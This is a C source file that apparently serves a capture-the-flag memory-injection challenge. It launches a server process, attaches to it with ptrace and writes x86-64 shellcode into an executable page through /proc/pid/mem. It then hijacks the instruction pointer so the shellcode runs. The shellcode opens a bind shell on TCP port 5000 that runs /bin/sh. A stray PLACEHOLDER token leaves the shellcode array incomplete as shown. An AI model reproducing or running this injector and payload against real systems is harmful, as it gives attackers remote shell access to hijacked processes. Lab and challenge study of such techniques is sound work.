// launcher.c
// gcc launcher.c -o launcher
// dd if=/proc/$(pgrep http_dev_server)/mem bs=1 skip=$((0x76c528553000)) count=128 2>/dev/null | hexdump -C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>

unsigned char shellcode[] =
    // "\x48\xB8\x69\x6E\x6A\x65\x63\x74\x7D\x00\x50"
    // "\x48\xB8\x65\x6E\x5F\x33\x5F\x6D\x65\x6D\x50"
    // "\x48\xB8\x50\x43\x43\x43\x7B\x74\x6F\x6B\x50"
    PLACEHOLDER
    "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
    "\x52\xc7\x04\x24\x02\x00\x13\x88\x48\x89\xe6\x6a\x10\x5a"
    "\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a"
    "\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21"
    "\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69"
    "\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
    "\x0f\x05";

size_t shellcode_len = sizeof(shellcode) - 1;

// Simple write into /proc/<pid>/mem
int write_mem(pid_t pid, unsigned long long addr, unsigned char *buf, size_t len) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);

    int fd = open(path, O_RDWR);
    if (fd == -1) {
        perror("open mem");
        return -1;
    }
    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) {
        perror("lseek");
        close(fd);
        return -1;
    }
    ssize_t w = write(fd, buf, len);
    if (w != (ssize_t)len) {
        perror("write");
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

struct server_info {
    pid_t pid;
    unsigned long long rx_addr;
};

// Start the HTTP server, return its PID
static pid_t start_server(void) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return -1;
    }

    if (pid == 0) {
        // Child: exec the server
        execl("/http_dev/http_dev_server", "/http_dev/http_dev_server", (char *)NULL);
        perror("execl");
        _exit(1);
    }

    // Parent: return child's PID
    return pid;
}

// Scan /proc/<pid>/maps for an anonymous 1-page RX region
static int find_rx_region(pid_t pid, unsigned long long *out_addr) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);

    FILE *f = fopen(path, "r");
    if (!f) {
        perror("fopen maps");
        return -1;
    }

    char line[512];
    while (fgets(line, sizeof(line), f)) {
        unsigned long long start, end;
        char perms[5];
        unsigned long offset;
        char dev[16];
        unsigned long inode;
        char pathname[256];

        // Try to parse: start-end perms offset dev inode [path...]
        int fields = sscanf(line, "%llx-%llx %4s %lx %15s %lu %255s",
                            &start, &end, perms, &offset, dev, &inode, pathname);

        // We want:
        //  - perms like r-xp
        //  - inode == 0
        //  - no pathname (fields < 7)
        //  - size == 4096 (one page) to match your alloc_rx_region
        if (fields >= 6 && fields < 7) {
            if (perms[0] == 'r' && perms[2] == 'x' && inode == 0) {
                if ((end - start) == 4096) {
                    *out_addr = start;
                    fclose(f);
                    return 0;
                }
            }
        }
    }

    fclose(f);
    fprintf(stderr, "Could not find anonymous 1-page RX region for pid %d\n", pid);
    return -1;
}

int main(void) {
    struct server_info info = {0};
    setenv("v", "1", 1);
    // 1. Start the server
    info.pid = start_server();
    if (info.pid <= 0) {
        fprintf(stderr, "Launcher: failed to start server.\n");
        return 1;
    }

    // 2. Give the server a moment to allocate the RX region
    //    (server itself sleeps(3), so 1s here is plenty)
    sleep(1);

    // 3. Find the RX region by scanning /proc/<pid>/maps
    if (find_rx_region(info.pid, &info.rx_addr) != 0) {
        fprintf(stderr, "Launcher: failed to locate RX region.\n");
        return 1;
    }

    printf("Launcher: server PID = %d\n", info.pid);
    printf("Launcher: RX region = 0x%llx\n", info.rx_addr);

    // 4. Attach
    pid_t pid = info.pid;
    unsigned long long addr = info.rx_addr;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace_attach");
        return 1;
    }
    waitpid(pid, NULL, 0);

    // 5. Write shellcode into that RX region
    if (write_mem(pid, addr, shellcode, shellcode_len) != 0) {
        fprintf(stderr, "Failed to write shellcode\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }

    // 6. Hijack RIP to our shellcode
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        perror("ptrace_getregs");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }

    unsigned long long old_rip = regs.rip;
    regs.rip = addr + 2;   // add 2

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
        perror("ptrace_setregs");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }

    printf("[*] Injected %zu bytes at 0x%llx, RIP: 0x%llx -> 0x%llx\n",
           shellcode_len, addr, (unsigned long long)old_rip, regs.rip);

    // 7. Continue execution
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
        perror("ptrace_cont");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }

    // Optionally wait a bit to let shellcode run
    sleep(1);

    // 8. Detach
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}
